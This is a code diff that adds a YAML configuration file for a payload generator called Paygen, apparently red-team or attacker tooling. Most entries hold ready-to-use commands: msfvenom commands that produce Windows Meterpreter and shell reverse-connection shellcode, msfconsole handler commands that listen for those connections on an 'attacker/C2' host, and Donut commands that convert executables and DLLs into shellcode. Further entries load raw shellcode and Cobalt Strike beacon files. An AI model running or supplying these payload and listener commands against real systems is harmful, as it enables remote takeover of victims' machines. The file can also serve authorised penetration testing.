@@ -1,0 +1,113 @@
+# Shellcode Configuration for Paygen
+# 
+# This file defines available shellcode generation methods that can be used in recipes.
+# Each entry specifies:
+# - name: Display name for the shellcode method
+# - parameters: List of parameters required for this method
+# - shellcode: Command template to generate the shellcode (supports Jinja2 variables)
+# - listener: Optional command template to start a listener (supports Jinja2 variables)
+
+- name: "Msfvenom Meterpreter Reverse TCP"
+  parameters:
+    - name: "lhost"
+      type: "ip"
+      description: "Attacker/C2 server IP address for reverse connection"
+      required: true
+    
+    - name: "lport"
+      type: "port"
+      description: "Listener port on attacker machine"
+      required: true
+      default: 443
+  
+  listener: "msfconsole -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j\""
+  
+  shellcode: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
+
+- name: "Msfvenom Meterpreter Reverse HTTPS"
+  parameters:
+    - name: "lhost"
+      type: "ip"
+      description: "Attacker/C2 server IP address for reverse connection"
+      required: true
+    
+    - name: "lport"
+      type: "port"
+      description: "Listener port on attacker machine"
+      required: true
+      default: 443
+  
+  listener: "msfconsole -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j\""
+  
+  shellcode: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
+
+- name: "Msfvenom Shell Reverse TCP"
+  parameters:
+    - name: "lhost"
+      type: "ip"
+      description: "Attacker/C2 server IP address for reverse connection"
+      required: true
+    
+    - name: "lport"
+      type: "port"
+      description: "Listener port on attacker machine"
+      required: true
+      default: 4444
+  
+  listener: "msfconsole -x \"use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j\""
+  
+  shellcode: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
+
+- name: "Donut - EXE to Shellcode"
+  parameters:
+    - name: "executable_path"
+      type: "file"
+      description: "Path to the executable (EXE) file to convert"
+      required: true
+    
+    - name: "executable_parameters"
+      type: "string"
+      description: "Command-line parameters to pass to the executable"
+      required: false
+      default: ""
+  
+  shellcode: "donut -i {{ executable_path }} -p \"{{ executable_parameters }}\" -a 2 -o /tmp/donut_payload.bin && cat /tmp/donut_payload.bin"
+
+- name: "Donut - DLL to Shellcode"
+  parameters:
+    - name: "dll_path"
+      type: "file"
+      description: "Path to the DLL file to convert"
+      required: true
+    
+    - name: "dll_function"
+      type: "string"
+      description: "Name of the exported function to call"
+      required: true
+      default: "DllMain"
+    
+    - name: "dll_parameters"
+      type: "string"
+      description: "Parameters to pass to the function"
+      required: false
+      default: ""
+  
+  shellcode: "donut -i {{ dll_path }} -m {{ dll_function }} -p \"{{ dll_parameters }}\" -a 2 -o /tmp/donut_payload.bin && cat /tmp/donut_payload.bin"
+
+- name: "Custom Shellcode from File"
+  parameters:
+    - name: "shellcode_file"
+      type: "file"
+      description: "Path to raw shellcode file"
+      required: true
+  
+  shellcode: "cat {{ shellcode_file }}"
+
+- name: "Cobalt Strike Beacon (shellcode file)"
+  parameters:
+    - name: "beacon_file"
+      type: "file"
+      description: "Path to Cobalt Strike beacon shellcode file (raw format)"
+      required: true
+  
+  shellcode: "cat {{ beacon_file }}"
